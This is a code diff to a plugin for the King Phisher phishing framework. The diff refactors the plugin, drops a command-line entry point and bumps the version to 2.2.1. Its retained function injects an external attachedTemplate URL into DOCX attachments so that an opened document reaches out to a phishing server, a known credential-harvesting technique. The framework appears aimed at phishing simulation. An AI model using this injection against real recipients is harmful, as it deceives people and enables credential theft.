@@ -1,4 +1,3 @@
-import argparse
 import distutils.version
 import os
 import random
@@ -9,9 +8,6 @@ import king_phisher.archive as archive
 import king_phisher.client.plugins as plugins
 import king_phisher.version as version
 
-PARSER_EPILOG = """\
-If no output file is specified, the input file will be modified in place.
-"""
 min_version = '1.9.0'
 StrictVersion = distutils.version.StrictVersion
 api_compatible = StrictVersion(version.distutils_version) >= StrictVersion(min_version)
@@ -24,9 +20,15 @@ def path_is_doc_file(path):
 	return True
 
 def phishery_inject(input_file, document_urls, output_file=None):
+	"""
+	Inject a word document URL into a DOCX file using the Phisher technique.
+
+	:param str input_file: The path to the input file to process.
+	:param tuple document_urls: The URLs to inject into the document.
+	:param str output_file: The output file to write the new document to.
+	"""
 	target_string = '<Relationship Id="{rid}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="{target_url}" TargetMode="External"/>'
 	input_file = os.path.abspath(input_file)
-	document_urls = document_urls.split()
 	rids = []
 	while len(rids) < len(document_urls):
 		rid = 'rId' + str(random.randint(10000, 99999))
@@ -65,7 +67,7 @@ class Plugin(getattr(plugins, 'ClientPluginMailerAttachment', plugins.ClientPlug
 	options = [
 		plugins.ClientOptionString(
 			'target_url',
-			'An optional target URLs. The default is the phishing URLs.',
+			'The URL to inject into the document. The default is the phishing URL.',
 			default='{{ url.webserver }}',
 			display_name='Target URLs',
 			**({'multiline': True} if api_compatible else {})
@@ -79,7 +81,7 @@ class Plugin(getattr(plugins, 'ClientPluginMailerAttachment', plugins.ClientPlug
 	]
 	reference_urls = ['https://github.com/ryhanson/phishery']
 	req_min_version = min_version
-	version = '2.2.0'
+	version = '2.2.1'
 	def initialize(self):
 		mailer_tab = self.application.main_tabs['mailer']
 		self.text_insert = mailer_tab.tabs['send_messages'].text_insert
@@ -102,7 +104,8 @@ class Plugin(getattr(plugins, 'ClientPluginMailerAttachment', plugins.ClientPlug
 		if target_url is None:
 			self.logger.warning('failed to get the target url, can not inject into the docx file')
 			return
-		phishery_inject(input_path, target_url, output_file=output_path)
+		document_urls = target_url.split()
+		phishery_inject(input_path, document_urls, output_file=output_path)
 		self.logger.info('wrote the patched file to: ' + output_path + ('' if target is None else ' with uid: ' + target.uid))
 
 	def signal_send_precheck(self, _):
@@ -125,16 +128,3 @@ class Plugin(getattr(plugins, 'ClientPluginMailerAttachment', plugins.ClientPlug
 			landing_page.lstrip('/')
 			self.application.rpc('campaign/landing_page/new', self.application.config['campaign_id'], hostname, landing_page)
 		return True
-
-def main():
-	parser = argparse.ArgumentParser(description='Phishery DOCX URL Injector Utility', conflict_handler='resolve')
-	parser.add_argument('-i', '--input', dest='input_file', required=True, help='the input file to inject into')
-	parser.add_argument('-o', '--output', dest='output_file', help='the output file to write')
-	parser.add_argument('-u', '--url', dest='target_url', required=True, help='the target url to inject into the input file')
-	parser.epilog = PARSER_EPILOG
-	arguments = parser.parse_args()
-
-	phishery_inject(arguments.input_file, arguments.target_url, output_file=arguments.output_file)
-
-if __name__ == '__main__':
-	main()
